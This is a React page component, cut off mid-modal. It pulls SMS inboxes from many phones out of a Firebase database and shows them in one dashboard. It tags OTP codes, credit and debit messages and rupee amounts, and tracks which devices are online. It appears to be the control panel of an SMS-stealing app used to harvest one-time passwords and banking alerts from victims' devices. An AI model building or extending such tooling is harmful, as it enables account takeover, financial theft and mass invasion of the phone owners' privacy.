// pages/AllDeviceSmsPage.jsx
import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { ref, get, onValue, update, query, orderByChild, limitToFirst, startAfter } from 'firebase/database';
import { db } from '../firebase/config';

function AllDeviceSmsPage() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [loadingMore, setLoadingMore] = useState(false);
  const [devices, setDevices] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedDeviceSms, setSelectedDeviceSms] = useState([]);
  const [showSmsDialog, setShowSmsDialog] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [filterSender, setFilterSender] = useState('all');
  const [filterType, setFilterType] = useState('all');
  const [timeFilter, setTimeFilter] = useState('all');
  const [deviceFilter, setDeviceFilter] = useState('all');
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage] = useState(20);
  const [allMessages, setAllMessages] = useState([]);
  const [filteredMessages, setFilteredMessages] = useState([]);
  const [onlineDevices, setOnlineDevices] = useState(new Set());
  const [isLive, setIsLive] = useState(false);
  const [viewMode, setViewMode] = useState('grid');
  const [selectedMessage, setSelectedMessage] = useState(null);
  const [showMessageDetail, setShowMessageDetail] = useState(false);
  const [sortOrder, setSortOrder] = useState('newest');
  const [animatedCard, setAnimatedCard] = useState(null);
  const [favorites, setFavorites] = useState({});
  const [lastLoaded, setLastLoaded] = useState(null);
  const [hasMore, setHasMore] = useState(true);
  const [stats, setStats] = useState({
    totalSms: 0,
    totalDevices: 0,
    senders: [],
    credit: 0,
    debit: 0,
    otp: 0,
    totalAmount: 0,
    spam: 0,
    promotional: 0,
    personal: 0
  });

  const containerRef = useRef(null);
  const searchTimeout = useRef(null);
  const loadingRef = useRef(false);

  // Load favorites from localStorage
  useEffect(() => {
    const savedFavorites = localStorage.getItem('smsFavorites');
    if (savedFavorites) {
      try {
        setFavorites(JSON.parse(savedFavorites));
      } catch (e) { }
    }
  }, []);

  // Save favorites to localStorage
  useEffect(() => {
    localStorage.setItem('smsFavorites', JSON.stringify(favorites));
  }, [favorites]);

  // Toggle Favorite
  const toggleFavorite = (msgId, e) => {
    e.stopPropagation();
    setFavorites(prev => {
      const newFav = { ...prev };
      if (newFav[msgId]) {
        delete newFav[msgId];
      } else {
        newFav[msgId] = true;
      }
      return newFav;
    });
  };

  // Detect message category - Optimized
  const detectCategory = useCallback((message) => {
    if (!message) return 'personal';
    const msg = message.toLowerCase();
    if (/(otp|verification|code|pin|password)/i.test(msg)) return 'personal';
    if (/(offer|discount|cashback|sale|promo|deal)/i.test(msg)) return 'promotional';
    if (/(spam|scam|fraud|suspicious|alert)/i.test(msg)) return 'spam';
    if (/(credited|debited|paid|payment|transaction|balance)/i.test(msg)) return 'personal';
    return 'personal';
  }, []);

  // Detect transaction type - Optimized
  const detectTransactionType = useCallback((message) => {
    if (!message) return 'normal';
    const msg = message.toLowerCase();
    if (/\b(\d{4,8})\b/.test(msg) && /(otp|verification|code|pin|password)/i.test(msg)) return 'otp';
    const creditKw = ['credited', 'credit', 'received', 'added', 'deposited', 'refund'];
    if (creditKw.some(k => msg.includes(k))) return 'credit';
    const debitKw = ['debited', 'debit', 'paid', 'payment', 'sent', 'withdrawn'];
    if (debitKw.some(k => msg.includes(k))) return 'debit';
    return 'normal';
  }, []);

  // Extract amount - Optimized
  const extractAmount = useCallback((message) => {
    if (!message) return null;
    const match = message.match(/[₹Rs.]+[\s]*([\d,]+(?:\.\d{2})?)/i);
    if (match) return parseFloat(match[1].replace(/,/g, ''));
    const match2 = message.match(/([\d,]+(?:\.\d{2})?)\s*(?:rs\.?|rupees)/i);
    if (match2) return parseFloat(match2[1].replace(/,/g, ''));
    return null;
  }, []);

  // Format helpers
  const formatAmount = (amt) => {
    if (!amt || isNaN(amt)) return '₹0';
    if (amt > 99999999) return '₹' + (amt / 10000000).toFixed(1) + 'Cr';
    if (amt > 99999) return '₹' + (amt / 100000).toFixed(1) + 'L';
    return '₹' + amt.toLocaleString('en-IN', { maximumFractionDigits: 0 });
  };

  const formatTime = (timestamp) => {
    if (!timestamp) return 'N/A';
    const date = new Date(Number(timestamp));
    return date.toLocaleString('en-IN', {
      day: '2-digit',
      month: 'short',
      hour: '2-digit',
      minute: '2-digit',
      hour12: true
    });
  };

  const formatTimeAgo = (timestamp) => {
    if (!timestamp) return 'Never';
    const diff = Date.now() - Number(timestamp);
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return `${Math.floor(diff / 86400000)}d ago`;
  };

  // ============================================
  // OPTIMIZED DATA FETCHING - BATCHED
  // ============================================
  const fetchAllSmsData = async () => {
    if (loadingRef.current) return;
    loadingRef.current = true;
    setLoading(true);

    try {
      // Step 1: Get devices list first (fast)
      const devicesRef = ref(db, 'devices');
      const devicesSnap = await get(devicesRef);

      if (!devicesSnap.exists()) {
        setDevices([]);
        setLoading(false);
        loadingRef.current = false;
        return;
      }

      const devicesData = devicesSnap.val();
      const deviceIds = Object.keys(devicesData);
      const allDevices = [];
      const onlineSet = new Set();

      // Check online status
      try {
        const statusSnap = await get(ref(db, 'device_status'));
        if (statusSnap.exists()) {
          const statusData = statusSnap.val();
          for (const [id, info] of Object.entries(statusData)) {
            if (info.status === 'active' || info.status === 'online') {
              onlineSet.add(id);
            }
          }
        }
      } catch (e) { }

      setOnlineDevices(onlineSet);

      // Build devices list
      for (const deviceId of deviceIds) {
        const device = devicesData[deviceId];
        const isOnline = onlineSet.has(deviceId) ||
          (device.lastSeen && (Date.now() - Number(device.lastSeen)) < 120000);

        allDevices.push({
          deviceId,
          serialNo: device.serialNo || 0,
          brand: device.brand || 'Unknown',
          model: device.model || 'Device',
          lastSeen: device.lastSeen || device.this_app_installTime,
          status: isOnline ? 'online' : 'offline',
          smsCount: 0,
          hasSms: false,
          allSmsData: {}
        });
      }

      // Step 2: Get SMS counts for each device (batched)
      const smsPromises = deviceIds.map(deviceId =>
        get(ref(db, `inbox/${deviceId}`)).catch(() => ({ exists: () => false }))
      );

      const smsResults = await Promise.all(smsPromises);

      let allMsgs = [];
      let creditCount = 0, debitCount = 0, otpCount = 0, totalAmount = 0;
      let spamCount = 0, promoCount = 0, personalCount = 0;
      const senderMap = {};

      // Process each device's SMS
      for (let i = 0; i < smsResults.length; i++) {
        const smsSnap = smsResults[i];
        const deviceId = deviceIds[i];

        if (smsSnap.exists()) {
          const data = smsSnap.val();
          const keys = Object.keys(data);
          const count = keys.length;

          // Update device
          const deviceIndex = allDevices.findIndex(d => d.deviceId === deviceId);
          if (deviceIndex !== -1) {
            allDevices[deviceIndex].smsCount = count;
            allDevices[deviceIndex].hasSms = count > 0;
            allDevices[deviceIndex].allSmsData = data;
          }

          // Process messages - LIMIT to prevent freezing
          const maxMsgs = 5000; // Process max 5000 messages per device
          const processKeys = keys.slice(0, maxMsgs);

          for (const key of processKeys) {
            const sms = data[key];
            const msg = {
              id: key,
              deviceId: deviceId,
              sender: sms.sender || 'Unknown',
              message: sms.message || sms.text || '',
              time: sms.time || sms.timestamp || Date.now(),
              simSlot: sms.simSlot,
              category: detectCategory(sms.message),
              type: detectTransactionType(sms.message),
              amount: extractAmount(sms.message),
              serialNo: allDevices[deviceIndex]?.serialNo || 0
            };
            allMsgs.push(msg);

            if (sms.sender) {
              senderMap[sms.sender] = (senderMap[sms.sender] || 0) + 1;
            }

            const type = msg.type;
            if (type === 'credit') creditCount++;
            else if (type === 'debit') debitCount++;
            else if (type === 'otp') otpCount++;

            const category = msg.category;
            if (category === 'spam') spamCount++;
            else if (category === 'promotional') promoCount++;
            else personalCount++;

            if (msg.amount) totalAmount += msg.amount;
          }
        }
      }

      allDevices.sort((a, b) => b.smsCount - a.smsCount);
      allMsgs.sort((a, b) => (b.time || 0) - (a.time || 0));

      setDevices(allDevices);
      setAllMessages(allMsgs);
      setFilteredMessages(allMsgs.slice(0, itemsPerPage * 2)); // Initial load only
      setHasMore(allMsgs.length > itemsPerPage * 2);

      setStats({
        totalSms: allMsgs.length,
        totalDevices: allDevices.filter(d => d.hasSms).length,
        senders: Object.keys(senderMap).sort(),
        credit: creditCount,
        debit: debitCount,
        otp: otpCount,
        totalAmount: totalAmount,
        spam: spamCount,
        promotional: promoCount,
        personal: personalCount
      });

      setLastLoaded(Date.now());

    } catch (error) {
      console.error('Error fetching SMS data:', error);
    }

    setLoading(false);
    loadingRef.current = false;
  };

  // ============================================
  // LAZY LOAD MORE MESSAGES
  // ============================================
  const loadMoreMessages = useCallback(() => {
    if (loadingMore || !hasMore) return;

    setLoadingMore(true);
    const currentCount = filteredMessages.length;
    const nextBatch = allMessages.slice(currentCount, currentCount + itemsPerPage);

    if (nextBatch.length > 0) {
      setFilteredMessages(prev => [...prev, ...nextBatch]);
      setHasMore(allMessages.length > currentCount + nextBatch.length);
    } else {
      setHasMore(false);
    }

    setLoadingMore(false);
  }, [allMessages, filteredMessages, hasMore, loadingMore, itemsPerPage]);

  // ============================================
  // INFINITE SCROLL WITH INTERSECTION OBSERVER
  // ============================================
  const observerRef = useRef(null);
  const lastElementRef = useCallback((node) => {
    if (loadingMore) return;
    if (observerRef.current) observerRef.current.disconnect();

    observerRef.current = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting && hasMore && !loadingMore) {
        loadMoreMessages();
      }
    });

    if (node) observerRef.current.observe(node);
  }, [loadingMore, hasMore, loadMoreMessages]);

  // ============================================
  // APPLY FILTERS - OPTIMIZED
  // ============================================
  const applyFilters = useCallback(() => {
    let filtered = [...allMessages];

    if (searchTerm) {
      const search = searchTerm.toLowerCase();
      filtered = filtered.filter(msg =>
        msg.deviceId.toLowerCase().includes(search) ||
        msg.sender.toLowerCase().includes(search) ||
        msg.message.toLowerCase().includes(search)
      );
    }

    if (deviceFilter !== 'all') {
      if (deviceFilter === 'online') {
        filtered = filtered.filter(msg => onlineDevices.has(msg.deviceId));
      } else {
        filtered = filtered.filter(msg => msg.deviceId === deviceFilter);
      }
    }

    if (filterType !== 'all') {
      filtered = filtered.filter(msg => msg.type === filterType);
    }

    if (timeFilter === 'today') {
      const today = new Date().setHours(0, 0, 0, 0);
      filtered = filtered.filter(msg => {
        const msgDate = new Date(Number(msg.time)).setHours(0, 0, 0, 0);
        return msgDate === today;
      });
    } else if (timeFilter === 'week') {
      const weekAgo = Date.now() - 7 * 86400000;
      filtered = filtered.filter(msg => Number(msg.time) > weekAgo);
    } else if (timeFilter === 'month') {
      const monthAgo = Date.now() - 30 * 86400000;
      filtered = filtered.filter(msg => Number(msg.time) > monthAgo);
    }

    if (sortOrder === 'newest') {
      filtered.sort((a, b) => (b.time || 0) - (a.time || 0));
    } else {
      filtered.sort((a, b) => (a.time || 0) - (b.time || 0));
    }

    // Limit initial filtered results
    const initialResults = filtered.slice(0, itemsPerPage * 2);
    setFilteredMessages(initialResults);
    setHasMore(filtered.length > itemsPerPage * 2);
    setCurrentPage(1);

    // Update stats for filtered results
    updateStats(filtered);
  }, [allMessages, searchTerm, deviceFilter, filterType, timeFilter, sortOrder, onlineDevices, itemsPerPage]);

  // ============================================
  // UPDATE STATS - OPTIMIZED
  // ============================================
  const updateStats = useCallback((messages) => {
    let credit = 0, debit = 0, otp = 0, totalAmt = 0;
    messages.forEach(msg => {
      const t = msg.type;
      if (t === 'credit') { credit++; if (msg.amount) totalAmt += msg.amount; }
      if (t === 'debit') { debit++; if (msg.amount) totalAmt += msg.amount; }
      if (t === 'otp') otp++;
    });
    const uniqueDevices = new Set(messages.map(m => m.deviceId));
    setStats(prev => ({
      ...prev,
      totalSms: messages.length,
      totalDevices: uniqueDevices.size,
      credit: credit,
      debit: debit,
      otp: otp,
      totalAmount: totalAmt
    }));
  }, []);

  // ============================================
  // GETTER FUNCTIONS
  // ============================================
  const getTypeBadge = useCallback((msg) => {
    const type = msg.type || detectTransactionType(msg.message);
    if (type === 'credit') return { text: '🟢 CREDIT', color: '#10b981', bg: 'rgba(16,185,129,0.15)' };
    if (type === 'debit') return { text: '🔴 DEBIT', color: '#ef4444', bg: 'rgba(239,68,68,0.15)' };
    if (type === 'otp') return { text: '🟠 OTP', color: '#f59e0b', bg: 'rgba(245,158,11,0.15)' };
    return { text: '📨 MESSAGE', color: '#6c63ff', bg: 'rgba(108,99,255,0.15)' };
  }, [detectTransactionType]);

  const getCategoryBadge = useCallback((category) => {
    if (category === 'spam') return { text: '🚫 SPAM', color: '#ef4444', bg: 'rgba(239,68,68,0.1)' };
    if (category === 'promotional') return { text: '📢 PROMO', color: '#f59e0b', bg: 'rgba(245,158,11,0.1)' };
    return { text: '👤 PERSONAL', color: '#6c63ff', bg: 'rgba(108,99,255,0.1)' };
  }, []);

  const openMessageDetail = (msg) => {
    setSelectedMessage(msg);
    setShowMessageDetail(true);
    document.body.style.overflow = 'hidden';
  };

  const closeMessageDetail = () => {
    setShowMessageDetail(false);
    document.body.style.overflow = 'auto';
    setTimeout(() => setSelectedMessage(null), 300);
  };

  const openSmsDialog = (device) => {
    const smsList = Object.values(device.allSmsData || {});
    smsList.sort((a, b) => (b.time || 0) - (a.time || 0));
    setSelectedDeviceSms(smsList);
    setSelectedDevice(device);
    setShowSmsDialog(true);
    document.body.style.overflow = 'hidden';
  };

  const closeSmsDialog = () => {
    setShowSmsDialog(false);
    document.body.style.overflow = 'auto';
    setTimeout(() => {
      setSelectedDeviceSms([]);
      setSelectedDevice(null);
    }, 300);
  };

  const getFilteredSms = () => {
    let smsList = selectedDeviceSms;
    if (filterSender !== 'all') {
      smsList = smsList.filter(s => s.sender === filterSender);
    }
    return smsList;
  };

  const filteredSms = getFilteredSms();
  const getDeviceSenders = () => {
    const senders = {};
    selectedDeviceSms.forEach(sms => {
      if (sms.sender) {
        senders[sms.sender] = (senders[sms.sender] || 0) + 1;
      }
    });
    return Object.keys(senders);
  };

  const openDeviceDetail = (deviceId) => {
    navigate(`/device/${deviceId}`);
  };

  // Initial load
  useEffect(() => {
    fetchAllSmsData();
  }, []);

  // Apply filters on change
  useEffect(() => {
    const timer = setTimeout(() => {
      if (allMessages.length > 0) {
        applyFilters();
      }
    }, 300);
    return () => clearTimeout(timer);
  }, [searchTerm, deviceFilter, filterType, timeFilter, sortOrder, allMessages, applyFilters]);

  if (loading) {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '100vh', background: 'var(--bg-primary)' }}>
        <div style={{ width: '40px', height: '40px', border: '3px solid rgba(108,99,255,0.1)', borderTopColor: '#6c63ff', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>
        <p style={{ color: 'var(--text-muted)', marginTop: '12px' }}>📡 Loading {stats.totalSms || '...'} messages...</p>
        <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px' }}>⏳ Please wait, this may take a moment</p>
        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      </div>
    );
  }

  // Get current page messages
  const startIndex = (currentPage - 1) * itemsPerPage;
  const currentMessages = filteredMessages.slice(startIndex, startIndex + itemsPerPage);
  const totalPages = Math.ceil(filteredMessages.length / itemsPerPage);
  const startSerial = startIndex + 1;

  return (
    <div ref={containerRef} style={{ padding: '12px 16px', maxWidth: '100%', background: 'var(--bg-primary)', minHeight: '100vh' }}>

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '12px', padding: '8px 0 14px', borderBottom: '2px solid var(--border-color)', marginBottom: '16px', flexWrap: 'wrap' }}>
        <button onClick={() => navigate('/')} style={{ background: 'none', border: 'none', color: 'var(--text-muted)', fontSize: '14px', fontWeight: 600, cursor: 'pointer', padding: '6px 10px', borderRadius: '8px' }}>
          ← Back
        </button>
        <h2 style={{ fontSize: '20px', fontWeight: 700, color: 'var(--text-primary)', margin: 0, flex: 1 }}>📨 SMS Inbox</h2>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
          <span style={{ fontSize: '12px', fontWeight: 600, color: '#6c63ff', background: 'rgba(108,99,255,0.1)', padding: '4px 14px', borderRadius: '20px' }}>
            📨 {stats.totalSms.toLocaleString()} SMS
          </span>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)' }}>
            ⏱️ {lastLoaded ? formatTimeAgo(lastLoaded) : 'N/A'}
          </span>
        </div>
      </div>

      {/* Stats - Simplified for performance */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(70px, 1fr))', gap: '6px', marginBottom: '16px' }}>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#6c63ff' }}>{stats.totalSms.toLocaleString()}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>📨 Total</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#2ecc71' }}>{stats.totalDevices}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>📱 Devices</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#10b981' }}>{stats.credit.toLocaleString()}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>🟢 Credit</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#ef4444' }}>{stats.debit.toLocaleString()}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>🔴 Debit</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#f59e0b' }}>{stats.otp.toLocaleString()}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>🟠 OTP</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#6c63ff' }}>{formatAmount(stats.totalAmount)}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>💰 Total</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#ef4444' }}>{stats.spam.toLocaleString()}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>🚫 Spam</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#f59e0b' }}>{stats.promotional.toLocaleString()}</div>
          <div style={{ fontSize: '7px', color: 'var(--text-muted)' }}>📢 Promo</div>
        </div>
      </div>

      {/* Filters */}
      <div style={{ background: 'var(--bg-card)', borderRadius: '12px', padding: '12px', marginBottom: '16px', border: '1px solid var(--border-color)' }}>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))', gap: '8px', marginBottom: '8px' }}>
          <div style={{ position: 'relative' }}>
            <span style={{ position: 'absolute', left: '10px', top: '50%', transform: 'translateY(-50%)', color: 'var(--text-muted)', fontSize: '12px' }}>🔍</span>
            <input
              type="text"
              placeholder="Search..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              style={{ width: '100%', padding: '6px 10px 6px 30px', border: '2px solid var(--border-color)', borderRadius: '8px', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: '12px', outline: 'none' }}
            />
          </div>
          <select
            value={deviceFilter}
            onChange={(e) => setDeviceFilter(e.target.value)}
            style={{ padding: '6px 10px', border: '2px solid var(--border-color)', borderRadius: '8px', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: '12px', outline: 'none' }}
          >
            <option value="all">📱 All Devices</option>
            <option value="online">🟢 Online</option>
          </select>
          <select
            value={timeFilter}
            onChange={(e) => setTimeFilter(e.target.value)}
            style={{ padding: '6px 10px', border: '2px solid var(--border-color)', borderRadius: '8px', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: '12px', outline: 'none' }}
          >
            <option value="all">📅 All</option>
            <option value="today">📅 Today</option>
            <option value="week">📅 Week</option>
            <option value="month">📅 Month</option>
          </select>
          <select
            value={sortOrder}
            onChange={(e) => setSortOrder(e.target.value)}
            style={{ padding: '6px 10px', border: '2px solid var(--border-color)', borderRadius: '8px', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: '12px', outline: 'none' }}
          >
            <option value="newest">🆕 Newest</option>
            <option value="oldest">📅 Oldest</option>
          </select>
        </div>

        <div style={{ display: 'flex', gap: '4px', flexWrap: 'wrap', marginBottom: '8px' }}>
          {['all', 'credit', 'debit', 'otp'].map(type => (
            <button
              key={type}
              onClick={() => { setFilterType(type); }}
              style={{
                padding: '3px 12px',
                borderRadius: '14px',
                border: `2px solid ${filterType === type ? '#6c63ff' : 'var(--border-color)'}`,
                background: filterType === type ? 'rgba(108,99,255,0.1)' : 'var(--bg-input)',
                color: filterType === type ? '#6c63ff' : 'var(--text-muted)',
                cursor: 'pointer',
                fontSize: '10px',
                fontWeight: 600
              }}
            >
              {type === 'all' ? '📨 All' : type === 'credit' ? '🟢 Credit' : type === 'debit' ? '🔴 Debit' : '🟠 OTP'}
            </button>
          ))}
        </div>

        <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>
          <button onClick={applyFilters} style={{ padding: '5px 14px', border: 'none', borderRadius: '6px', background: 'linear-gradient(135deg, #6c63ff, #3b82f6)', color: 'white', cursor: 'pointer', fontSize: '11px', fontWeight: 600 }}>
            🔍 Apply
          </button>
          <button onClick={() => { setSearchTerm(''); setDeviceFilter('all'); setTimeFilter('all'); setFilterType('all'); setSortOrder('newest'); applyFilters(); }} style={{ padding: '5px 14px', border: '2px solid var(--border-color)', borderRadius: '6px', background: 'var(--bg-input)', color: 'var(--text-muted)', cursor: 'pointer', fontSize: '11px', fontWeight: 600 }}>
            🗑️ Clear
          </button>
          <button onClick={fetchAllSmsData} style={{ padding: '5px 14px', border: 'none', borderRadius: '6px', background: '#28a745', color: 'white', cursor: 'pointer', fontSize: '11px', fontWeight: 600 }}>
            🔄 Refresh
          </button>
        </div>
      </div>

      {/* Message Count */}
      <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginBottom: '10px' }}>
        Showing {currentMessages.length} of {filteredMessages.length} messages
        {hasMore && filteredMessages.length < allMessages.length && (
          <span style={{ marginLeft: '8px', color: '#6c63ff' }}>
            ({allMessages.length - filteredMessages.length} more)
          </span>
        )}
      </div>

      {/* Messages Grid */}
      <div style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))',
        gap: '10px'
      }}>
        {currentMessages.length === 0 ? (
          <div style={{ gridColumn: '1/-1', textAlign: 'center', padding: '40px 20px', color: 'var(--text-muted)', background: 'var(--bg-card)', borderRadius: '12px', border: '1px solid var(--border-color)' }}>
            <span style={{ fontSize: '40px', display: 'block', marginBottom: '8px' }}>📭</span>
            <p>No messages found</p>
          </div>
        ) : (
          currentMessages.map((msg, index) => {
            const typeInfo = getTypeBadge(msg);
            const categoryInfo = getCategoryBadge(msg.category);
            const isOnline = onlineDevices.has(msg.deviceId);
            const isAnimated = animatedCard === index;
            const serialNumber = startSerial + index;
            const isFavorite = favorites[msg.id];

            return (
              <div
                key={msg.id || index}
                ref={index === currentMessages.length - 1 && hasMore ? lastElementRef : null}
                onClick={() => openMessageDetail(msg)}
                onMouseEnter={() => setAnimatedCard(index)}
                onMouseLeave={() => setAnimatedCard(null)}
                style={{
                  background: 'var(--bg-card)',
                  borderRadius: '10px',
                  padding: '12px 14px',
                  border: '1px solid var(--border-color)',
                  borderLeft: `4px solid ${typeInfo.color}`,
                  boxShadow: isAnimated ? '0 4px 20px rgba(108,99,255,0.08)' : '0 1px 4px rgba(0,0,0,0.02)',
                  transition: 'all 0.3s ease',
                  cursor: 'pointer',
                  transform: isAnimated ? 'translateY(-2px)' : 'translateY(0)',
                  position: 'relative',
                  overflow: 'hidden'
                }}
              >
                {/* Serial & Favorite */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <span style={{
                      fontSize: '9px',
                      fontWeight: 700,
                      color: 'var(--text-muted)',
                      background: 'var(--bg-input)',
                      padding: '1px 8px',
                      borderRadius: '8px',
                      border: '1px solid var(--border-color)'
                    }}>
                      #{serialNumber}
                    </span>
                    <span style={{ fontSize: '9px', fontWeight: 600, color: '#6c63ff', background: 'rgba(108,99,255,0.08)', padding: '1px 8px', borderRadius: '8px' }}>
                      📱 {msg.deviceId.slice(0, 8)}... {isOnline ? '🟢' : '⚫'}
                    </span>
                  </div>
                  <button
                    onClick={(e) => toggleFavorite(msg.id, e)}
                    style={{
                      background: 'none',
                      border: 'none',
                      fontSize: '16px',
                      cursor: 'pointer',
                      padding: '0 4px',
                      color: isFavorite ? '#f1c40f' : 'var(--text-muted)',
                      transition: 'transform 0.2s'
                    }}
                    onMouseEnter={(e) => e.target.style.transform = 'scale(1.2)'}
                    onMouseLeave={(e) => e.target.style.transform = 'scale(1)'}
                  >
                    {isFavorite ? '⭐' : '☆'}
                  </button>
                </div>

                {/* Sender & Time */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                  <span style={{ fontSize: '13px', fontWeight: 700, color: typeInfo.color }}>
                    📩 {msg.sender || 'Unknown'}
                  </span>
                  <span style={{ fontSize: '9px', color: 'var(--text-muted)' }}>
                    {formatTimeAgo(msg.time)}
                  </span>
                </div>

                {/* Amount */}
                {msg.amount && (
                  <div style={{ fontSize: '16px', fontWeight: 700, color: typeInfo.color, marginBottom: '4px' }}>
                    {formatAmount(msg.amount)}
                  </div>
                )}

                {/* Message */}
                <div style={{
                  fontSize: '12px',
                  color: 'var(--text-secondary)',
                  lineHeight: '1.4',
                  maxHeight: '40px',
                  overflow: 'hidden',
                  textOverflow: 'ellipsis',
                  display: '-webkit-box',
                  WebkitLineClamp: 2,
                  WebkitBoxOrient: 'vertical',
                  marginBottom: '6px'
                }}>
                  {msg.message || 'No message content'}
                </div>

                {/* Footer */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: '4px', borderTop: '1px solid var(--border-color)' }}>
                  <span style={{ fontSize: '8px', fontWeight: 600, padding: '1px 8px', borderRadius: '8px', background: typeInfo.bg, color: typeInfo.color }}>
                    {typeInfo.text}
                  </span>
                  <span style={{ fontSize: '8px', padding: '1px 8px', borderRadius: '8px', background: categoryInfo.bg, color: categoryInfo.color }}>
                    {categoryInfo.text}
                  </span>
                </div>
              </div>
            );
          })
        )}
      </div>

      {/* Loading More */}
      {loadingMore && (
        <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)' }}>
          <div style={{ display: 'inline-block', width: '24px', height: '24px', border: '2px solid rgba(108,99,255,0.1)', borderTopColor: '#6c63ff', borderRadius: '50%', animation: 'spin 0.6s linear infinite', marginRight: '10px' }}></div>
          Loading more...
        </div>
      )}

      {/* Pagination */}
      {totalPages > 1 && (
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '16px', flexWrap: 'wrap' }}>
          <button
            onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
            disabled={currentPage === 1}
            style={{
              padding: '5px 12px',
              border: '2px solid var(--border-color)',
              borderRadius: '6px',
              background: currentPage === 1 ? 'var(--bg-input)' : 'var(--bg-card)',
              color: currentPage === 1 ? 'var(--text-muted)' : 'var(--text-primary)',
              cursor: currentPage === 1 ? 'not-allowed' : 'pointer',
              fontSize: '11px',
              fontWeight: 600
            }}
          >
            ◀ Prev
          </button>
          <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
            Page {currentPage} of {totalPages}
          </span>
          <button
            onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
            disabled={currentPage === totalPages}
            style={{
              padding: '5px 12px',
              border: '2px solid var(--border-color)',
              borderRadius: '6px',
              background: currentPage === totalPages ? 'var(--bg-input)' : 'var(--bg-card)',
              color: currentPage === totalPages ? 'var(--text-muted)' : 'var(--text-primary)',
              cursor: currentPage === totalPages ? 'not-allowed' : 'pointer',
              fontSize: '11px',
              fontWeight: 600
            }}
          >
            Next ▶
          </button>
        </div>
      )}

      <style>{`
        @keyframes spin{to{transform:rotate(360deg)}}
        @keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
        @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}
      `}</style>

      {/* Message Detail Modal */}
      {showMessageDetail && selectedMessage && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,0.8)',
            backdropFilter: 'blur(16px)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 99999,
            padding: '20px',
            animation: 'fadeIn 0.3s ease'
          }}
          onClick={closeMessageDetail}
        >
          <div
            style={{
              background: 'var(--bg-card)',
              borderRadius: '16px',
